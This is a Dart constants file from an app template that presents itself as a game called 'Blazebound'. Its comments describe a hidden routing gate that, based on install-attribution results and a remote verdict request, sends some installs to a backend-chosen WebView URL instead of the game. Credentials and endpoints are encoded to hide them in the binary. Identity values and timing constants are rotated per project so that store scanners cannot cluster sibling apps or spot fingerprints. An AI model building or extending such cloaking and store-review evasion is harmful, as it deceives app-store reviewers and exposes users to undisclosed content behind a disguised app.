import 'masked_bytes.dart';

// ============================================================
// MIDWAY BRIEF — single source of truth for project-wide constants
// ============================================================
// Identity values are plain constants (the store listing makes them
// public anyway — encoding them would only look suspicious). Every
// credential / endpoint / UA fragment resolves lazily through the
// `unlock*` getters in `masked_bytes.dart`, so no plaintext
// credential ever appears as a string literal in the binary.
//
// [FORGE] Every `[FORGE]` field is rotated per project by
// `dart run tool/forge/mint.dart`. Never ship two projects with the
// same triplet (`applicationId`, `marketId`, `displayName`) — store
// scanners cluster on identity even when the codec bytes differ.
// ============================================================

abstract final class MidwayBrief {
  // ─────────────────────────────────────────────────────────
  // Identity (public — matches the store listing)
  // ─────────────────────────────────────────────────────────
  // [FORGE] Filled by mint.dart from the customer brief. Must
  // EXACTLY match:
  //   • android/app/build.gradle.kts → applicationId + namespace
  //   • android/app/src/main/kotlin/**/MainActivity.kt package
  //   • android/app/google-services.json → package_name
  //   • android/app/src/main/AndroidManifest.xml → android:label
  //   • pubspec.yaml → name (snake_case slug of displayName)
  static const String applicationId = 'com.embervault.blazebound'; // [FORGE]
  static const String marketId = 'com.embervault.blazebound'; // [FORGE]
  static const String displayName = 'Blazebound'; // [FORGE]

  /// Numeric iOS App Store id. Empty on Android-only builds; the
  /// backend contract treats "" as "unavailable, use the applicationId
  /// as store_id" (see the Config Request contract).
  static const String storeNumericId = '';

  // ─────────────────────────────────────────────────────────
  // Timings — every constant is [FORGE]-rotated
  // ─────────────────────────────────────────────────────────
  // Numeric constants survive `--obfuscate`. The forge rotates each
  // to a project-unique value from a range, so no two sibling apps
  // share the same magic number. Do NOT hand-edit — regenerate via
  // `dart run tool/forge/mint.dart --rotate`.
  //
  // See `.cursor/rules/portfolio_registry.md` for the ranges and the
  // anti-collision policy.

  /// Snooze after the user taps "Skip" on the permission stage.
  /// 2d 23h 58m 37s — 83 seconds under three days, and not shared by
  /// any sibling project (taken offsets: 97, 147, 211).
  static const int permissionSnoozeSeconds = 3 * 24 * 60 * 60 - 83;

  /// Delay before rescuing an `af_status: "Organic"` first callback.
  /// Range: 4..12 seconds.
  static const int organicRescueDelay = 12;

  /// Ruling POST timeout. Range: 10..25 seconds.
  static const int verdictTimeoutSeconds = 22;

  /// Awaiting install-conversion payload on a first launch.
  /// Range: 20..40 seconds.
  static const int firstInstallAwaitSeconds = 35;

  /// Awaiting install-conversion payload on a returning launch.
  /// Range: 3..10 seconds.
  static const int returningInstallAwaitSeconds = 4;

  /// Deep-link callback wait. Range: 3..8 seconds.
  static const int deepLinkAwaitSeconds = 6;

  /// DNS probe timeout. Range: 4..9 seconds. Keep ≥ 4 s so a slow
  /// VPN tunnel does not produce false offline verdicts.
  static const int reachProbeTimeoutSeconds = 4;

  /// Debounce before committing a connectivity-drop signal into the
  /// offline routing. Range: 500..1200 ms.
  static const int reachDropDebounceMs = 910;

  /// Redirect-loop retries in the WebView on error `-1007` / `-9`.
  /// Range: 1..5. Keep low; a value ≥ 5 is a fingerprint.
  static const int redirectLoopRetries = 2;

  /// Cached destination URL freshness window. Range: 3..14 days.
  static const int cachedUrlLifetimeSeconds = 583200;

  // ─────────────────────────────────────────────────────────
  // Resolved (encoded) endpoints & credentials
  // ─────────────────────────────────────────────────────────
  static String get endpointUrl => unlockEndpointUrl();
  static String get attributionKey => unlockAttributionKey();
  static String get messagingProjectId => unlockMessagingProject();

  static String get storeId {
    if (storeNumericId.isNotEmpty) return 'id$storeNumericId';
    return marketId;
  }

  /// The routing gate stays disabled — every install lands in the
  /// native game — until all three encoded values are populated. This
  /// is intentional: the template compiles and runs without the
  /// manager's credentials, and QA can smoke-test the game path before
  /// the backend is wired up.
  static bool get credentialsReady =>
      endpointUrl.isNotEmpty &&
      attributionKey.isNotEmpty &&
      messagingProjectId.isNotEmpty;
}
